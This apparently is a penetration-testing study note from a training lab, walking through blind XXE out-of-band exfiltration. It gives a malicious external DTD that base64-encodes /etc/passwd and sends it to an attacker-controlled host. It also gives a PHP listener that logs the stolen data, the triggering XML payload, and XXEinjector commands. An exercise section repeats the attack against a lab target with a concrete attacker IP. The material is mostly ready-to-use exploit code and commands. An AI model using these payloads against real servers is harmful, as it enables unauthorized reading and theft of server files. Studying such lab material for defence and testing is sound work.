We can use `Out-of-band (OOB) Data Exfiltration`
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

```php
# Finds the encoded content
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>

php -S 0.0.0.0:8000
```

To start the attack simply add  this to the payload
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```
Then send the request
![[Blind-Data-Exfiltration.png]]

# Automated OOB Exfiltration
[Exfiltrator](https://github.com/enjoiz/XXEinjector)
```bash
git clone https://github.com/enjoiz/XXEinjector.git

# Then copy it to a file.
# Write XXEINJECT at the bottom
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

Finally
`cat Logs/10.129.201.94/etc/passwd.log`

# Exercise
Post
```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.16.28:8000/xxe2.dtd">
  %remote;
  %oob;
]>
<root>
&content;
</root>
```

XXE.dtd
```bash
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/327a6c4304ad5938eaf0efb6cc3e53dc.php">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.16.28:8000/?content=%file;'>">
```

Index.php
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Hosting it
`php -S 0.0.0.0:8000`
Then hitting send and depending on the directory it shows what the contents are.